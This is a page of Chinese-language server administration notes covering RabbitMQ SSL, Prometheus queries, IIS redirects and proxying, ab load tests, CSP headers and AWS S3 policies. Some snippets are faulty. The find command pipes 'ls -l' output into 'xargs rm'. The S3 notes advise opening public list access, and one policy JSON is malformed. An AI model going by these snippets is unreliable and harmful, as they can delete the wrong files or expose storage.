 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 打开alias支持
shopt -s expand_aliases&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="rabbitmq-ssl-证书配置"&gt;&lt;span&gt;rabbitmq ssl 证书配置&lt;/span&gt;
 &lt;a href="#rabbitmq-ssl-%e8%af%81%e4%b9%a6%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://www.cnblogs.com/hellxz/p/15776987.html" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://www.cnblogs.com/hellxz/p/15776987.html&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;# ssl-server: 
sh make_server_cert.sh rabbitmq-server &amp;lt;server_passwd&amp;gt;
# ssl-client:
sh create_client_cert.sh rabbitmq-client &amp;lt;client_passwd&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="prometheus-不同指标计间的计算方法"&gt;&lt;span&gt;prometheus 不同指标计间的计算方法&lt;/span&gt;
 &lt;a href="#prometheus-%e4%b8%8d%e5%90%8c%e6%8c%87%e6%a0%87%e8%ae%a1%e9%97%b4%e7%9a%84%e8%ae%a1%e7%ae%97%e6%96%b9%e6%b3%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;## redis_memory_used_bytes Redis 内存使用量
### redis_memory_used_bytes{cloudtype=&amp;#34;阿里云&amp;#34;, hostname=&amp;#34;riecaeph0noo&amp;#34;, instance=&amp;#34;127.0.0.1:16370&amp;#34;, job=&amp;#34;RedisStatusMonitor&amp;#34;, ostype=&amp;#34;linux&amp;#34;, services=&amp;#34;redis&amp;#34;} 3322384
## node_memory_MemTotal_bytes 系统总内存
### node_memory_MemTotal_bytes{cloudtype=&amp;#34;阿里云&amp;#34;, hostname=&amp;#34;riecaeph0noo&amp;#34;, instance=&amp;#34;1.1.1.1&amp;#34;, job=&amp;#34;ServerStatusMonitor&amp;#34;, ostype=&amp;#34;linux&amp;#34;, services=&amp;#34;server&amp;#34;} 32868929536

# 方法一: 
## 计算 Redis 内存使用量占主机内存总和的百分比(适用指标标签不一致的情况)

redis_memory_used_bytes / on(hostname) group_left label_replace(node_memory_MemTotal_bytes, &amp;#34;hostname_group&amp;#34;, &amp;#34;&amp;#34;, &amp;#34;hostname&amp;#34;, &amp;#34;(.*)&amp;#34;) * 100 &amp;gt; 90

# 方法二: 

redis_memory_used_bytes / on(hostname) group_left node_memory_MemTotal_bytes&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="iis-http-强制跳转-https"&gt;&lt;span&gt;IIS http 强制跳转 https&lt;/span&gt;
 &lt;a href="#iis-http-%e5%bc%ba%e5%88%b6%e8%b7%b3%e8%bd%ac-https" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;此项未校验,来源于&lt;code&gt;chatgpt&lt;/code&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;configuration&amp;gt;
&amp;lt;system.webServer&amp;gt;
 &amp;lt;rewrite&amp;gt;
 &amp;lt;rules&amp;gt;
 &amp;lt;rule name=&amp;#34;Force HTTPS&amp;#34; stopProcessing=&amp;#34;true&amp;#34;&amp;gt;
 &amp;lt;match url=&amp;#34;(.*)&amp;#34; /&amp;gt;
 &amp;lt;conditions&amp;gt;
 &amp;lt;add input=&amp;#34;{HTTPS}&amp;#34; pattern=&amp;#34;off&amp;#34; ignoreCase=&amp;#34;true&amp;#34; /&amp;gt;
 &amp;lt;/conditions&amp;gt;
 &amp;lt;!-- 临时重定向 --&amp;gt;
 &amp;lt;!-- &amp;lt;action type=&amp;#34;Redirect&amp;#34; redirectType=&amp;#34;Temporary&amp;#34; url=&amp;#34;https://{HTTP_HOST}/{R:1}&amp;#34; /&amp;gt; --&amp;gt;
 &amp;lt;action type=&amp;#34;Redirect&amp;#34; redirectType=&amp;#34;Permanent&amp;#34; url=&amp;#34;https://{HTTP_HOST}/{R:1}&amp;#34; /&amp;gt;
 &amp;lt;/rule&amp;gt;
 &amp;lt;/rules&amp;gt;
 &amp;lt;/rewrite&amp;gt;
&amp;lt;/system.webServer&amp;gt;
&amp;lt;/configuration&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="find-文件性能提升"&gt;&lt;span&gt;find 文件性能提升&lt;/span&gt;
 &lt;a href="#find-%e6%96%87%e4%bb%b6%e6%80%a7%e8%83%bd%e6%8f%90%e5%8d%87" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# find 查询大量文件删除时会很慢，可以用ls 配合 grep 查询需要删除的文件，然后删除
$&amp;gt; find /path/to/directory -type f -name &amp;#34;*.txt&amp;#34; -exec ls -l {} \; | grep &amp;#34;pattern&amp;#34; | xargs rm&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="压力测试-ab-命令解释"&gt;&lt;span&gt;压力测试 `ab`` 命令解释&lt;/span&gt;
 &lt;a href="#%e5%8e%8b%e5%8a%9b%e6%b5%8b%e8%af%95-ab-%e5%91%bd%e4%bb%a4%e8%a7%a3%e9%87%8a" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# httpd-tools 
# -n: 总共要发送的请求 
# -c: 并发连接
# -r: 随机数据，防止缓存
## 例如: 50个人，每秒访问100次, 那么总共发送请求为 50 * 100 = 5000 (-n)
$&amp;gt; ab -n 5000 -c 50 -r http://www.example.com/&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="https页面加载http资源报错的方法"&gt;&lt;span&gt;https页面加载http资源报错的方法&lt;/span&gt;
 &lt;a href="#https%e9%a1%b5%e9%9d%a2%e5%8a%a0%e8%bd%bdhttp%e8%b5%84%e6%ba%90%e6%8a%a5%e9%94%99%e7%9a%84%e6%96%b9%e6%b3%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;解决方案:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;服务端设置&lt;code&gt;header&lt;/code&gt;: &lt;code&gt;header(&amp;quot;Content-Security-Policy: upgrade-insecure-requests&amp;quot;);&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;页面设置&lt;code&gt;meta&lt;/code&gt;头: &lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;Content-Security-Policy&amp;quot; content=&amp;quot;upgrade-insecure-requests&amp;quot; /&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;删除链接中的协议头: &lt;code&gt;&amp;lt;script src='//cdn.bootcss.com/jquery/3.3.1/jquery.min.js'&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nginx&lt;/code&gt;添加&lt;code&gt;header&lt;/code&gt;: &lt;code&gt;add_header Content-Security-Policy &amp;quot;upgrade-insecure-requests&amp;quot;;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="mysql-授权-all-privileges-时当前用户是具备执行-alter-user-的权限的但仅限于修改自己的密码无法修改其他用户"&gt;&lt;span&gt;mysql 授权 ALL PRIVILEGES 时，当前用户是具备执行 ALTER USER 的权限的，但仅限于修改自己的密码，无法修改其他用户&lt;/span&gt;
 &lt;a href="#mysql-%e6%8e%88%e6%9d%83-all-privileges-%e6%97%b6%e5%bd%93%e5%89%8d%e7%94%a8%e6%88%b7%e6%98%af%e5%85%b7%e5%a4%87%e6%89%a7%e8%a1%8c-alter-user-%e7%9a%84%e6%9d%83%e9%99%90%e7%9a%84%e4%bd%86%e4%bb%85%e9%99%90%e4%ba%8e%e4%bf%ae%e6%94%b9%e8%87%aa%e5%b7%b1%e7%9a%84%e5%af%86%e7%a0%81%e6%97%a0%e6%b3%95%e4%bf%ae%e6%94%b9%e5%85%b6%e4%bb%96%e7%94%a8%e6%88%b7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h2 class="heading-element" id="windows-iis-反向代理配置"&gt;&lt;span&gt;Windows IIS 反向代理配置&lt;/span&gt;
 &lt;a href="#windows-iis-%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://github.com/axllent/mailpit/issues/131" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://github.com/axllent/mailpit/issues/131&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;前置条件
&lt;ul&gt;
&lt;li&gt;安装 &lt;a href="https://www.iis.net/downloads/microsoft/url-rewrite" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;url-rewrite&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt; 模块&lt;/li&gt;
&lt;li&gt;安装 &lt;a href="https://www.iis.net/downloads/microsoft/application-request-routing" target="_blank" rel="external nofollow noopener noreferrer"&gt;&lt;code&gt;application-request-routing&lt;/code&gt;&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt; 模块(此项安装前，必须先安装 &lt;code&gt;url-rewrite&lt;/code&gt; 模块)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;配置
&lt;ul&gt;
&lt;li&gt;打开&lt;code&gt;IIS&lt;/code&gt;,找到 &lt;code&gt;Application Request Routing Cache&lt;/code&gt;打开，点击右侧&lt;code&gt;Server Proxy Setings&lt;/code&gt;,勾选 &lt;code&gt;Enable proxy&lt;/code&gt;，点击右侧&lt;code&gt;应用&lt;/code&gt;即可。&lt;/li&gt;
&lt;li&gt;打开&lt;code&gt;IIS&lt;/code&gt;,选择网站, 打开 &lt;code&gt;URL Rewrite(URL 重写)&lt;/code&gt;, 点击右侧&lt;code&gt;添加规则&lt;/code&gt;，选择&lt;code&gt;空白规则&lt;/code&gt;，模式配置&lt;code&gt;(.*)&lt;/code&gt;,操作选择&lt;code&gt;重写&lt;/code&gt;, 重写URL设置需要反向代理的地址, 例如: 需要代理到 &lt;code&gt;http://127.0.0.1:8080/&lt;/code&gt;,则填写 &lt;code&gt;http://127.0.0.1:8080/{R:1}&lt;/code&gt;，其他默认，保存即可。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 class="heading-element" id="亚马逊存储桶"&gt;&lt;span&gt;亚马逊存储桶&lt;/span&gt;
 &lt;a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e5%ad%98%e5%82%a8%e6%a1%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;新建存储通无论是公开或私有，应优先考虑以下规则&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建存储桶(可公有访问权限)&lt;/li&gt;
&lt;li&gt;设置&amp;quot;对象所有权&amp;quot;为&lt;code&gt;ACL已启用&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;设置&amp;quot;对象所有权&amp;quot;为&lt;code&gt;存储桶拥有者优先&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;将 &lt;code&gt;此存储桶的“屏蔽公共访问权限”设置&lt;/code&gt;取消&lt;code&gt;阻止所有公开访问&lt;/code&gt;勾选，只勾选&lt;code&gt;阻止通过新公有存储桶策略或接入点策略授予的存储桶和对象公有访问&lt;/code&gt;和&lt;code&gt;阻止通过任何公有存储桶策略或接入点策略对存储桶和对象的公有和跨账户访问&lt;/code&gt;，其他默认即可&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 class="heading-element" id="存储桶规则创建及示例"&gt;&lt;span&gt;存储桶规则创建及示例&lt;/span&gt;
 &lt;a href="#%e5%ad%98%e5%82%a8%e6%a1%b6%e8%a7%84%e5%88%99%e5%88%9b%e5%bb%ba%e5%8f%8a%e7%a4%ba%e4%be%8b" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;存储桶策略&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// 此策略是为授权 cloudfront 可访问 S3 特定存储桶的所有读取权限(通过此方法设定的可以不受存储桶默认文件权限限制。根据上述存储桶规则创建内容，默认上传权限是不允许公网读的)
// CDN 创建时候设置 
// Origin domain: (&amp;lt;存储桶名&amp;gt;.s3.&amp;lt;区域名&amp;gt;.amazonaws.com) 
// 来源访问: 来源访问控制设置 - Create new OAC
// 其他参数默认即可 
// 以下json可以在cdn创建成功后，通过提示窗口直接复制，然后添加到 存储桶-权限-存储桶策略 中
{
 &amp;#34;Version&amp;#34;: &amp;#34;2008-10-17&amp;#34;,
 &amp;#34;Id&amp;#34;: &amp;#34;PolicyForCloudFrontPrivateContent&amp;#34;,
 &amp;#34;Statement&amp;#34;: [
 {
 &amp;#34;Sid&amp;#34;: &amp;#34;AllowCloudFrontServicePrincipal&amp;#34;,
 &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;,
 &amp;#34;Principal&amp;#34;: {
 &amp;#34;Service&amp;#34;: &amp;#34;cloudfront.amazonaws.com&amp;#34;
 },
 &amp;#34;Action&amp;#34;: &amp;#34;s3:GetObject&amp;#34;,
 &amp;#34;Resource&amp;#34;: &amp;#34;arn:aws:s3:::&amp;lt;存储桶名&amp;gt;/*&amp;#34;,
 &amp;#34;Condition&amp;#34;: {
 &amp;#34;StringEquals&amp;#34;: {
 &amp;#34;AWS:SourceArn&amp;#34;: &amp;#34;CND创建成功后的arn&amp;#34;
 }
 }
 }
 ]
}&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;访问控制列表(ACL): 这个权限控制我测试发现似乎只是控制程序用户是否可以操作存储桶内容的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;s3fs 挂载:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;## https://github.com/s3fs-fuse/s3fs-fuse
## 注意: 启用OAC的需要使用 sigv4 才能正常连接 
$&amp;gt; vim /etc/fstab 
s3fs#&amp;lt;存储桶名&amp;gt; &amp;lt;挂载到的目录&amp;gt; fuse auto,_netdev,sigv4,allow_other,passwd_file=/etc/sysconfig/passwd-s3fs,endpoint=ap-east-1,use_path_request_style,url=https://s3.ap-east-1.amazonaws.com 0 0&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="亚马逊用户策略"&gt;&lt;span&gt;亚马逊用户策略&lt;/span&gt;
 &lt;a href="#%e4%ba%9a%e9%a9%ac%e9%80%8a%e7%94%a8%e6%88%b7%e7%ad%96%e7%95%a5" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;// 方案一 
// 注意: 若是按照上面存储通步骤创建存储桶，那么需要手动打开 `权限` - `访问控制列表(ACL)` 中 所有人(公有访问权限) 的 `列出` 权限，否则通过api无法正常操作(s3 brower也需要开启此项设置)
// 以下策略用于控制仅限`特定用户`操作特定的存储桶，该策略附加给用户
{
 &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;,
 &amp;#34;Statement&amp;#34;: [
 {
 &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;,
 &amp;#34;Action&amp;#34;: [
 &amp;#34;s3:*&amp;#34;
 ],
 &amp;#34;Resource&amp;#34;: [
 &amp;#34;arn:aws:s3:::&amp;lt;存储桶名&amp;gt;/*&amp;#34;
 ]
 }
 ]
}
// 方案二 
// 以下策略设置在 `存储桶` - `权限` - `存储桶策略` 中，用于控制存储桶接受那个用户操作，该策略是附加给存储桶的 
// https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/example-bucket-policies.html
{
 &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;,
 &amp;#34;Statement&amp;#34;: [
 {
 &amp;#34;Sid&amp;#34;: &amp;#34;AddPublicReadCannedAcl&amp;#34;,
 &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;,
 &amp;#34;Principal&amp;#34;: {
 &amp;#34;AWS&amp;#34;: [
 &amp;#34;用户的ARN&amp;#34;,
 ]
 },
 &amp;#34;Action&amp;#34;: [
 &amp;#34;s3:*&amp;#34;
 ],
 &amp;#34;Resource&amp;#34;: &amp;#34;arn:aws:s3:::存储桶名/*&amp;#34;,
 &amp;#34;Condition&amp;#34;: {
 &amp;#34;StringEquals&amp;#34;: {
 &amp;#34;s3:x-amz-acl&amp;#34;: [
 &amp;#34;public-read&amp;#34; // 必须指定的ACL权限
 ]
 }
 }
 }
 ]
}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="gnome-shell-终端设置-title"&gt;&lt;span&gt;gnome-shell 终端设置 title&lt;/span&gt;
